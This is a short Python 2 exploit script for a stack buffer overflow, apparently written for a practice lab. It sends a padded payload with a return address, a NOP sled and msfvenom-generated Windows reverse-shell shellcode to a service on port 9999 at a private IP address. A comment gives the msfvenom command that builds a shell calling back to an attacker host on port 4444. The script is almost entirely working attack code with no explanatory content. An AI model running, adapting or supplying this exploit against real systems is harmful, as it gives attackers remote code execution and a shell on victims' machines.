#!/usr/bin/python
import sys
import socket

# found bad chars- \x00
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.75.144 LPORT=4444 -f c -a x86 -b "\x00"
overflow = (
	"\xdb\xd2\xb8\xcf\x18\x95\xeb\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
	"\x52\x31\x43\x17\x03\x43\x17\x83\x24\xe4\x77\x1e\x46\xfd\xfa"
	"\xe1\xb6\xfe\x9a\x68\x53\xcf\x9a\x0f\x10\x60\x2b\x5b\x74\x8d"
	"\xc0\x09\x6c\x06\xa4\x85\x83\xaf\x03\xf0\xaa\x30\x3f\xc0\xad"
	"\xb2\x42\x15\x0d\x8a\x8c\x68\x4c\xcb\xf1\x81\x1c\x84\x7e\x37"
	"\xb0\xa1\xcb\x84\x3b\xf9\xda\x8c\xd8\x4a\xdc\xbd\x4f\xc0\x87"
	"\x1d\x6e\x05\xbc\x17\x68\x4a\xf9\xee\x03\xb8\x75\xf1\xc5\xf0"
	"\x76\x5e\x28\x3d\x85\x9e\x6d\xfa\x76\xd5\x87\xf8\x0b\xee\x5c"
	"\x82\xd7\x7b\x46\x24\x93\xdc\xa2\xd4\x70\xba\x21\xda\x3d\xc8"
	"\x6d\xff\xc0\x1d\x06\xfb\x49\xa0\xc8\x8d\x0a\x87\xcc\xd6\xc9"
	"\xa6\x55\xb3\xbc\xd7\x85\x1c\x60\x72\xce\xb1\x75\x0f\x8d\xdd"
	"\xba\x22\x2d\x1e\xd5\x35\x5e\x2c\x7a\xee\xc8\x1c\xf3\x28\x0f"
	"\x62\x2e\x8c\x9f\x9d\xd1\xed\xb6\x59\x85\xbd\xa0\x48\xa6\x55"
	"\x30\x74\x73\xf9\x60\xda\x2c\xba\xd0\x9a\x9c\x52\x3a\x15\xc2"
	"\x43\x45\xff\x6b\xe9\xbc\x68\x54\x46\xf5\xf8\x3c\x95\x09\xe8"
	"\xe0\x10\xef\x60\x09\x75\xb8\x1c\xb0\xdc\x32\xbc\x3d\xcb\x3f"
	"\xfe\xb6\xf8\xc0\xb1\x3e\x74\xd2\x26\xcf\xc3\x88\xe1\xd0\xf9"
	"\xa4\x6e\x42\x66\x34\xf8\x7f\x31\x63\xad\x4e\x48\xe1\x43\xe8"
	"\xe2\x17\x9e\x6c\xcc\x93\x45\x4d\xd3\x1a\x0b\xe9\xf7\x0c\xd5"
	"\xf2\xb3\x78\x89\xa4\x6d\xd6\x6f\x1f\xdc\x80\x39\xcc\xb6\x44"
	"\xbf\x3e\x09\x12\xc0\x6a\xff\xfa\x71\xc3\x46\x05\xbd\x83\x4e"
	"\x7e\xa3\x33\xb0\x55\x67\x43\xfb\xf7\xce\xcc\xa2\x62\x53\x91"
	"\x54\x59\x90\xac\xd6\x6b\x69\x4b\xc6\x1e\x6c\x17\x40\xf3\x1c"
	"\x08\x25\xf3\xb3\x29\x6c"
	)

crash = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 20 + overflow
shellcode = crash + '\r\n'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#connect=s.connect(('10.11.23.92',9999))
	connect=s.connect(('192.168.75.145',9999))
	s.send(shellcode)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit()